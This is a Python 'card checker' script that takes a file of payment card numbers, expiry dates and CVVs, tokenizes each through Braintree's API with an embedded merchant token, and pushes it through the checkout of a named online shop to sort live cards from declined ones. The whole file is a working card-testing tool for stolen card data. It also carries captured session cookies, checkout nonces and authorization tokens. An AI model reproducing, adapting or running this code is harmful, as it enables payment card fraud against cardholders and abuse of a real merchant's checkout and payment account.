import requests
import time
import re
from colorama import init, Fore, Style

# Initialize colorama for colored output
init()

# Headers for the first request (Braintree tokenization)
headers_token = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-MA,ar;q=0.9,en-US;q=0.8,en;q=0.7,ar-LB;q=0.6,ar-BH;q=0.5,ar-DZ;q=0.4,ar-JO;q=0.3,ar-PS;q=0.2,es-IC;q=0.1,es;q=0.1',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTY1NjExMjIsImp0aSI6Ijk5NjNhMmQ1LTEyNjAtNDQ3NC04MDg5LTZjZTY2MzI4ZTc4ZCIsInN1YiI6Ijh2cXZzbWsyaGJtNDdjNHQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijh2cXZzbWsyaGJtNDdjNHQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IlBheUluc3RhbnRPcmRlclNlcnZpY2VzX2luc3RhbnQifX0.BoVwNcrjkdp9Mq3ysNUKl6qvCVHDoblDeKcWRpH8QPTHwOlmylLBr92f27e9JjvXOvnUZAYbuOnJ9w5xiP_PQw',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

# Cookies for the second request (Checkout)
cookies_checkout = {
    'electron_wishlist_key': 'FGN876',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-08-29%2013%3A38%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.vrtechbay.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-08-29%2013%3A38%3A03%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.vrtechbay.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'woocommerce_items_in_cart': '1',
    'wp_woocommerce_session_14bd596b11ed810b46ff5b31e3817343': 't_b1ed66e45175780bb6b7179d13ae28%7C%7C1756647504%7C%7C1756643904%7C%7C1bdd940685a20bde3de2275f94235c57',
    'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.vrtechbay.com%2Fcheckout%2F',
    'stopbadbots_cookie': '%23Africa/Cairo%23-180%23linux%20armv81%23Android%235%2Ctrue%2Ctrue%231%231',
    'tu-geoip-ajax': '%7B%22city%22%3A%22Cairo%22%2C%22state%22%3A%22Cairo%20Governorate%22%2C%22country%22%3A%22Egypt%22%7D',
    'tu-geoip-hide': 'true',
    'woocommerce_cart_hash': 'be497e8f1c48ae17a73df6dec1aeeb87',
}

# Headers for the second request (Checkout)
headers_checkout = {
    'authority': 'www.vrtechbay.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-MA,ar;q=0.9,en-US;q=0.8,en;q=0.7,ar-LB;q=0.6,ar-BH;q=0.5,ar-DZ;q=0.4,ar-JO;q=0.3,ar-PS;q=0.2,es-IC;q=0.1,es;q=0.1',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.vrtechbay.com',
    'referer': 'https://www.vrtechbay.com/checkout/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

# Function to read cards from file
def read_cards(file_path):
    cards = []
    with open(file_path, 'r') as file:
        for line in file:
            line = line.strip()
            if line:
                cards.append(line)
    return cards

# Function to process a single card
def process_card(card):
    try:
        number, month, year, cvv = card.split('|')
        
        # First request: Tokenize Credit Card
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'c0408a4e-1cd6-4930-bdbe-a764f9eeb012',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': number,
                        'expirationMonth': month,
                        'expirationYear': year,
                        'cvv': cvv,
                        'billingAddress': {
                            'postalCode': '50450',
                            'streetAddress': '10549 Scripps Poway Pkwy',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=json_data)
        response_json = response.json()

        if 'errors' in response_json:
            print(f"{Fore.RED}[-] Card: {card} - Error: {response_json['errors'][0]['message']}{Style.RESET_ALL}")
            return

        token = response_json['data']['tokenizeCreditCard']['token']

        # Second request: Checkout
        params = {'wc-ajax': 'checkout'}
        data = f'wpae_initiator=&alt_s=&gbdxva4724=161670&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fwww.vrtechbay.com%2Fcart%2F&wc_order_attribution_session_start_time=2025-08-29+13%3A38%3A03&wc_order_attribution_session_pages=4&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F137.0.0.0+Mobile+Safari%2F537.36&billing_first_name=EMMA&billing_last_name=Cloak&billing_company=&billing_country=US&billing_address_1=10549+Scripps+Poway+Pkwy&billing_address_2=&billing_city=Wilayah+Persekutuan&billing_state=CA&billing_postcode=50450&billing_phone=0377825879&billing_email=alaazimmo909%40gmail.com&wc_apbct_email_id=&honey_1756474722=&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=CA&shipping_postcode=&order_comments=&shipping_method%5B0%5D=wf_multi_carrier_shipping%3Ausps_USPS+Ground+Advantage&payment_method=braintree_cc&braintree_cc_nonce_key={token}&braintree_cc_device_data=%7B%22correlation_id%22%3A%22c0408a4e-1cd6-4930-bdbe-a764f9ee%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2F8vqvsmk2hbm47c4t%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2F8vqvsmk2hbm47c4t%22%7D%2C%22merchantId%22%3A%228vqvsmk2hbm47c4t%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22braintreeApi%22%3A%7B%22accessToken%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTY1NjExMTUsImp0aSI6IjI1MWZmNDI2LTRkZTgtNDM3My04ZjZlLTMzMDVjZjcyOGNiYyIsInN1YiI6Ijh2cXZzbWsyaGJtNDdjNHQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijh2cXZzbWsyaGJtNDdjNHQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbInRva2VuaXplIiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpDbGllbnRTREsiXSwib3B0aW9ucyI6e319.pnr99Ul20PqV9VW_R1M-cLQyC-mWpLte-Bk0BRoIwe6-tVQKLjuln_XR7nWVaDa09uU39i1RDPVhZEM3Lpq4bQ%22%2C%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%22%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22MasterCard%22%2C%22American+Express%22%2C%22Discover%22%2C%22JCB%22%2C%22Visa%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22androidPay%22%3A%7B%22displayName%22%3A%22VR+Tech+Bay%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTY1NjExMTUsImp0aSI6ImE2NWQwMTE0LTBmODMtNGVmZS05ZjgzLTU2OTM3ZTU1MjNiMyIsInN1YiI6Ijh2cXZzbWsyaGJtNDdjNHQiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijh2cXZzbWsyaGJtNDdjNHQiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpDbGllbnRTREsiXSwib3B0aW9ucyI6e319.drtyT6CVljQMSB_wR8PZX43PtY0DJsoIMC4Y9tH49iIgLu918VLezIfhtxmxBpNsIyrTnib_UDeo_9f_i1ERFw%22%2C%22paypalClientId%22%3Anull%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22paypalEnabled%22%3Afalse%7D&mailpoet_woocommerce_checkout_optin_present=1&cr_customer_consent_field=1&terms=on&terms-field=1&woocommerce-process-checkout-nonce=84a5b82d39&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ct_bot_detector_event_token=93b73fcf68d73a1810aa1c968511715620d53c52ad42dde38fedafd75f840041&apbct_visible_fields=eyIwIjp7InZpc2libGVfZmllbGRzIjoiYWx0X3MgZ2JkeHZhNDcyNCBiaWxsaW5nX2ZpcnN0X25hbWUgYmlsbGluZ19sYXN0X25hbWUgYmlsbGluZ19jb21wYW55IGJpbGxpbmdfYWRkcmVzc18xIGJpbGxpbmdfYWRkcmVzc18yIGJpbGxpbmdfY2l0eSBiaWxsaW5nX3N0YXRlIGJpbGxpbmdfcG9zdGNvZGUgYmlsbGluZ19waG9uZSBiaWxsaW5nX2VtYWlsIHdjX2FwYmN0X2VtYWlsX2lkIGhvbmV5XzE3NTY0NzQ3MjIgYWNjb3VudF9wYXNzd29yZCBzaGlwcGluZ19maXJzdF9uYW1lIHNoaXBwaW5nX2xhc3RfbmFtZSBzaGlwcGluZ19jb21wYW55IHNoaXBwaW5nX2FkZHJlc3NfMSBzaGlwcGluZ19hZGRyZXNzXzIgc2hpcHBpbmdfY2l0eSBzaGlwcGluZ19zdGF0ZSBzaGlwcGluZ19wb3N0Y29kZSBvcmRlcl9jb21tZW50cyIsInZpc2libGVfZmllbGRzX2NvdW50IjoyNCwiaW52aXNpYmxlX2ZpZWxkcyI6IndwYWVfaW5pdGlhdG9yIHdjX29yZGVyX2F0dHJpYnV0aW9uX3NvdXJjZV90eXBlIHdjX29yZGVyX2F0dHJpYnV0aW9uX3JlZmVycmVyIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9jYW1wYWlnbiB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fc291cmNlIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9tZWRpdW0gd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX2NvbnRlbnQgd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX2lkIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV90ZXJtIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9zb3VyY2VfcGxhdGZvcm0gd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX2NyZWF0aXZlX2Zvcm1hdCB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fbWFya2V0aW5nX3RhY3RpYyB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX2VudHJ5IHdjX29yZGVyX2F0dHJpYnV0aW9uX3Nlc3Npb25fc3RhcnRfdGltZSB3Y19vcmRlcl9hdHRyaWJ1dGlvbl9zZXNzaW9uX3BhZ2VzIHdjX29yZGVyX2F0dHJpYnV0aW9uX3Nlc3Npb25fY291bnQgd2Nfb3JkZXJfYXR0cmlidXRpb25fdXNlcl9hZ2VudCBiaWxsaW5nX2NvdW50cnkgc2hpcHBpbmdfY291bnRyeSBicmFpbnRyZWVfY2Nfbm9uY2Vfa2V5IGJyYWludHJlZV9jY19kZXZpY2VfZGF0YSBicmFpbnRyZWVfY2NfM2RzX25vbmNlX2tleSBicmFpbnRyZWVfY2NfY29uZmlnX2RhdGEgbWFpbHBvZXRfd29vY29tbWVyY2VfY2hlY2tvdXRfb3B0aW5fcHJlc2VudCBjcl9jdXN0b21lcl9jb25zZW50X2ZpZWxkIHRlcm1zLWZpZWxkIHdvb2NvbW1lcmNlLXByb2Nlc3MtY2hlY2tvdXQtbm9uY2UgX3dwX2h0dHBfcmVmZXJlciBjdF9ib3RfZGV0ZWN0b3JfZXZlbnRfdG9rZW4iLCJpbnZpc2libGVfZmllbGRzX2NvdW50IjoyOX19'

        response = requests.post('https://www.vrtechbay.com/', params=params, cookies=cookies_checkout, headers=headers_checkout, data=data)
        response_json = response.json()

        # Extract the message
        messages = response_json.get('messages', '')
        declined_message = re.search(r'<li>(.*?)</li>', messages).group(1) if messages else "No message found"

        # Determine if the card is declined
        if 'declined' in declined_message.lower():
            print(f"{Fore.RED}[-] Card: {card} - {declined_message}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] Card: {card} - {declined_message}{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}[-] Card: {card} - Error: {str(e)}{Style.RESET_ALL}")

# Main function to process cards from file
def main():
    print(f"{Fore.CYAN}╔════════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║        Professional Card Checker Tool       ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚════════════════════════════════════════════╝{Style.RESET_ALL}")
    file_path = input(f"{Fore.YELLOW}[?] Enter the path to the card file: {Style.RESET_ALL}")
    cards = read_cards(file_path)
    
    if not cards:
        print(f"{Fore.RED}[!] No cards found in the file.{Style.RESET_ALL}")
        return

    print(f"{Fore.CYAN}[*] Found {len(cards)} cards to process.{Style.RESET_ALL}")
    print(f"{Fore.CYAN}══════════════════════════════════════════════{Style.RESET_ALL}")

    for i, card in enumerate(cards, 1):
        print(f"{Fore.YELLOW}[*] Processing card {i}/{len(cards)}...{Style.RESET_ALL}")
        process_card(card)
        time.sleep(5)  # 5-second delay between checks
        print(f"{Fore.CYAN}══════════════════════════════════════════════{Style.RESET_ALL}")

    print(f"{Fore.GREEN}[*] All cards processed!{Style.RESET_ALL}")

if __name__ == "__main__":
    main()